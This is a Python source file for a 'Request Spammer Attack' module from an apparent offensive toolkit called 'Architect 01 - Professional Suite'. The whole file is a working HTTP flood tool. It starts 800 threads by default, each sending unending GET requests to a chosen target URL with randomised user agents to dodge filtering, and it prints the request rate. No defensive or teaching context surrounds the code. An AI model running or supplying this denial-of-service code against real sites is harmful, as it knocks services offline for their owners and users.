#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Request Spammer Attack
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from colorama import Fore, Style
from core.utils.useragents import get_random_ua

class RequestSpammer:
    """Simple request spammer - Support semua protocol"""
    
    def __init__(self, target_url, threads=800):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.request_count = 0
        self.error_count = 0
        
    def spam_worker(self):
        session = requests.Session()
        
        while self.running:
            try:
                ua = get_random_ua()
                headers = {'User-Agent': ua}
                
                response = session.get(self.target_url, headers=headers, timeout=5, allow_redirects=True)
                
                self.request_count += 1
                
                if self.request_count % 1000 == 0:
                    print(Fore.GREEN + "╰─❯ [" + threading.current_thread().name + "] Total spam: " + str(self.request_count) + Style.RESET_ALL)
            except:
                self.error_count += 1
                session = requests.Session()
    
    def start(self):
        print(Fore.YELLOW + "\n╰─❯ Starting Request Spam on " + self.target_url)
        print(Fore.YELLOW + "╰─❯ Threads: " + str(self.threads))
        print(Fore.YELLOW + "╰─❯ Mode: MAXIMUM SPAM")
        print(Fore.YELLOW + "╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
        
        requests.packages.urllib3.disable_warnings()
        
        for i in range(self.threads):
            worker = threading.Thread(target=self.spam_worker, name="S" + str(i+1))
            worker.daemon = True
            worker.start()
        
        try:
            last_count = 0
            while self.running:
                time.sleep(3)
                new_req = self.request_count - last_count
                rps = new_req / 3
                last_count = self.request_count
                
                print(Fore.CYAN + "╰─❯ Total: " + str(self.request_count) + " | RPS: " + str(round(rps, 1)) + " | Errors: " + str(self.error_count) + Style.RESET_ALL)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        print(Fore.RED + "\n╰─❯ Stopping Request Spam...")
        print(Fore.RED + "╰─❯ Total requests sent: " + str(self.request_count))
        print(Fore.RED + "╰─❯ Total errors: " + str(self.error_count) + Style.RESET_ALL)
